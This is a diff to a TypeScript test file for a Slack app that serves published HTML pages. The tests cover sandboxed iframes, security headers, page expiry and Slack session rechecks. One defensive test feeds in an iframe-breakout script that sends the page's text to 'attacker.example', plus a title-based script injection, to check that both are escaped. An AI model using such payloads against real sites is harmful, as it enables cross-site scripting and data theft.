@@ -6,7 +6,7 @@ import { processEvent, type SlackEnvelope } from "../src/events";
 import { createApp } from "../src/index";
 import { hostedApp, type Installation } from "../src/installations";
 import { base64UrlEncode, encryptSlackSecrets, signSlackToken } from "../src/lib/slack-secrets";
-import { PAGE_CSP, SESSION_COOKIE, SIGN_IN_COOKIE } from "../src/page-viewer";
+import { PAGE_CSP, PAGE_SANDBOX, SESSION_COOKIE, SESSION_RECHECK_MS, SIGN_IN_COOKIE } from "../src/page-viewer";
 import {
 	MAX_LIVE_PAGES,
 	MAX_PAGE_BYTES,
@@ -136,6 +136,19 @@ describe("PageStore", () => {
 		expect(storageOf(store()).count("pages")).toBe(0);
 		expect(storageOf(store()).alarm).toBeNull();
 	});
+
+	it("after a failed check, still wakes when the next page expires if that is sooner than the retry", async () => {
+		vi.useFakeTimers({ toFake: ["Date"] });
+		vi.setSystemTime(NOW + DAY);
+		await published({ expiresAt: NOW + DAY + 5 * 60_000 });
+		world.db.select = async () => { throw new Error("database unavailable"); };
+		await store().alarm();
+		expect(storageOf(store()).alarm).toBe(NOW + DAY + 5 * 60_000);
+		vi.setSystemTime(NOW + DAY + 5 * 60_000);
+		await store().alarm();
+		expect(storageOf(store()).count("pages")).toBe(0);
+		expect(storageOf(store()).alarm).toBeNull();
+	});
 });
 
 type Execute = (input: Record<string, unknown>) => Promise<Record<string, unknown>>;
@@ -151,6 +164,7 @@ describe("publish_page", () => {
 		expect(Object.keys((tool.parameters as { properties: object }).properties)).toEqual(["title", "html"]);
 		expect(tool.description).toContain("kept for 7 days");
 		expect(tool.description).toContain("Who can view it: anyone with the link.");
+		expect(tool.description).toContain("Links don't open anything");
 		await expect(execute(tool, { title: " ", html: HTML })).rejects.toThrow("title must not be empty");
 		await expect(execute(tool, { title: "x".repeat(121), html: HTML })).rejects.toThrow("at most 120 characters");
 		await expect(execute(tool, { title: "Spend", html: "" })).rejects.toThrow("html must not be empty");
@@ -227,24 +241,51 @@ describe("publish_page", () => {
 	});
 });
 
+/** The page a served response shows in its frame, and the outer page around it. */
+async function framed(response: Response): Promise<{ outer: string; srcdoc: string }> {
+	const outer = await response.text();
+	const attribute = outer.match(/ srcdoc="([^"]*)"/)?.[1];
+	if (attribute === undefined) throw new Error("no srcdoc frame");
+	return { outer, srcdoc: attribute.replace(/&#(\d+);/g, (_, code: string) => String.fromCharCode(Number(code))) };
+}
+
 describe("serving a page", () => {
-	it("serves a link page under the sandbox, with no caching or referrer, and counts the view", async () => {
+	it("serves a link page in a sandboxed frame of a page that holds nothing else, with no caching or referrer, and counts the view", async () => {
 		const id = await published();
 		const response = await request(`/p/${storeKey()}/${id}`);
 		expect(response.status).toBe(200);
-		expect(await response.text()).toBe(HTML);
 		expect(Object.fromEntries(response.headers)).toMatchObject({
 			"content-type": "text/html; charset=utf-8",
-			"content-security-policy": "sandbox allow-scripts; default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; connect-src 'none'; form-action 'none'; frame-ancestors 'none'; base-uri 'none'",
+			"content-security-policy": "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; connect-src 'none'; frame-src 'none'; child-src 'none'; form-action 'none'; frame-ancestors 'none'; base-uri 'none'",
 			"x-content-type-options": "nosniff",
 			"referrer-policy": "no-referrer",
 			"cache-control": "private, no-store",
 			"x-frame-options": "DENY",
 			"x-robots-tag": "noindex, nofollow, noarchive",
 		});
-		expect(PAGE_CSP).not.toContain("allow-same-origin");
+		const { outer, srcdoc } = await framed(response);
+		expect(srcdoc).toBe(HTML);
+		// The page's markup is only ever the frame's srcdoc, and the frame may run scripts and nothing else.
+		expect(outer).not.toContain("<h1>");
+		expect(outer).not.toContain("<script");
+		expect(outer.match(/<iframe [^>]*>/g)).toEqual([`<iframe sandbox="allow-scripts" title="October spend" srcdoc="${outer.match(/ srcdoc="([^"]*)"/)![1]}">`]);
+		expect(PAGE_SANDBOX).toBe("allow-scripts");
+		expect(PAGE_CSP).not.toContain("sandbox");
+		expect(outer).toContain("<title>October spend</title>");
 		expect(response.headers.get("set-cookie")).toBeNull();
 		expect((await store().list(NOW))[0].views).toBe(1);
+	});
+
+	it("keeps a page's markup and title out of the outer page, whatever they hold", async () => {
+		const html = `<!doctype html><title>x</title>"></iframe><script>top.location = "https://attacker.example/?t=" + document.body.innerText</script>&#34; '`;
+		const title = `</title><script>alert(1)</script> "quoted" & 'single'`;
+		const id = await published({ html, title });
+		const { outer, srcdoc } = await framed(await request(`/p/${storeKey()}/${id}`));
+		expect(srcdoc).toBe(html);
+		expect(outer).not.toContain("<script");
+		expect(outer.match(/<iframe /g)).toHaveLength(1);
+		expect(outer.match(/<\/iframe>/g)).toHaveLength(1);
+		expect(outer).toContain("<title>&#60;/title&#62;&#60;script&#62;alert(1)&#60;/script&#62; &#34;quoted&#34; &#38; &#39;single&#39;</title>");
 	});
 
 	it("is not found: unknown, malformed, expired or deleted pages, and stores this namespace never made", async () => {
@@ -359,7 +400,10 @@ describe("Sign in with Slack for workspace pages", () => {
 		const cookie = session.split(";")[0];
 		const page = await request(`/p/${storeKey()}/${id}`, { cookie });
 		expect(page.status).toBe(200);
-		expect(await page.text()).toBe(HTML);
+		expect((await framed(page)).srcdoc).toBe(HTML);
+		// The sign-in's users.info answer is fresh: no new call, no new cookie.
+		expect(world.slack.of("users.info")).toHaveLength(1);
+		expect(page.headers.get("set-cookie")).toBeNull();
 		expect((await store().list(NOW))[0].views).toBe(1);
 		// A session is for one installation, and can't be altered.
 		const other = await signSlackToken(world.env, "page_session", { installation_id: "00000000-0000-4000-8000-0000000000ff", slack_user_id: "U0VIEWER01" }, 3600, NOW);
@@ -423,6 +467,75 @@ describe("Sign in with Slack for workspace pages", () => {
 		expect(await guest.text()).toContain("not with its guests");
 		world.db.tables.slack_installations[0].allow_guests = true;
 		expect((await signIn(id)).response.status).toBe(303);
+	});
+
+	const sessionOf = (response: Response) => response.headers.getSetCookie().find((cookie) => cookie.startsWith(`${SESSION_COOKIE}=`))!;
+	const clearedSession = `${SESSION_COOKIE}=; Path=/p/; Max-Age=0; HttpOnly; Secure; SameSite=Lax`;
+
+	it("ends a guest's session as soon as admins stop allowing guests, without asking Slack", async () => {
+		const id = await published({ access: "workspace" });
+		world.slack.users.set("U0VIEWER01", { id: "U0VIEWER01", team_id: TEAM_ID, is_restricted: true });
+		const cookie = sessionOf((await signIn(id)).response).split(";")[0];
+		expect((await request(`/p/${storeKey()}/${id}`, { cookie })).status).toBe(200);
+		world.db.tables.slack_installations[0].allow_guests = false;
+		const refused = await request(`/p/${storeKey()}/${id}`, { cookie });
+		expect(refused.status).toBe(403);
+		expect(await refused.text()).toContain("not with its guests");
+		expect(refused.headers.get("set-cookie")).toBe(clearedSession);
+		expect(world.slack.of("users.info")).toHaveLength(1);
+		expect((await store().list(NOW))[0].views).toBe(1);
+	});
+
+	it("asks Slack again once the session's last check is 10 minutes old, at most once per view, and keeps its end", async () => {
+		const id = await published({ access: "workspace" });
+		let cookie = sessionOf((await signIn(id)).response).split(";")[0];
+		const view = () => request(`/p/${storeKey()}/${id}`, { cookie });
+
+		world.clock.now = NOW + SESSION_RECHECK_MS - 1;
+		expect((await view()).status).toBe(200);
+		expect(world.slack.of("users.info")).toHaveLength(1);
+
+		world.clock.now = NOW + SESSION_RECHECK_MS;
+		const rechecked = await view();
+		expect(rechecked.status).toBe(200);
+		expect(world.slack.of("users.info")).toHaveLength(2);
+		// A renewed cookie that ends when the sign-in's would (8 hours after it).
+		const renewed = sessionOf(rechecked);
+		expect(renewed).toMatch(new RegExp(`; Max-Age=${8 * 60 * 60 - SESSION_RECHECK_MS / 1000}; HttpOnly; Secure; SameSite=Lax$`));
+		cookie = renewed.split(";")[0];
+		world.clock.now = NOW + 2 * SESSION_RECHECK_MS - 1;
+		expect((await view()).status).toBe(200);
+		expect(world.slack.of("users.info")).toHaveLength(2);
+
+		// Slack can't answer: no page, and the session stays for a later try.
+		world.clock.now = NOW + 2 * SESSION_RECHECK_MS;
+		world.slack.failUsersInfo = true;
+		const unavailable = await view();
+		expect(unavailable.status).toBe(503);
+		expect(unavailable.headers.get("set-cookie")).toBeNull();
+		world.slack.failUsersInfo = false;
+
+		// Deactivated (they left the workspace): the session ends.
+		world.slack.users.set("U0VIEWER01", { id: "U0VIEWER01", team_id: TEAM_ID, deleted: true });
+		const left = await view();
+		expect(left.status).toBe(403);
+		expect(left.headers.get("set-cookie")).toBe(clearedSession);
+		expect(world.slack.of("users.info")).toHaveLength(4);
+		expect((await store().list(world.clock.now))[0].views).toBe(3);
+	});
+
+	it("checks a session from before checks were recorded at once, and ends it for someone now in another organisation", async () => {
+		const id = await published({ access: "workspace" });
+		const old = await signSlackToken(world.env, "page_session", { installation_id: INSTALLATION_ID, slack_user_id: "U0VIEWER01" }, 3600, NOW);
+		const first = await request(`/p/${storeKey()}/${id}`, { cookie: `${SESSION_COOKIE}=${old}` });
+		expect(first.status).toBe(200);
+		expect(sessionOf(first)).toMatch(/; Max-Age=3600; /);
+		expect(world.slack.of("users.info").map((call) => call.args.user)).toEqual(["U0VIEWER01"]);
+		world.slack.users.set("U0VIEWER01", { id: "U0VIEWER01", team_id: "T0OTHER001" });
+		const moved = await request(`/p/${storeKey()}/${id}`, { cookie: `${SESSION_COOKIE}=${old}` });
+		expect(moved.status).toBe(403);
+		expect(await moved.text()).toContain("people of another Slack workspace");
+		expect(moved.headers.get("set-cookie")).toBe(clearedSession);
 	});
 });
 
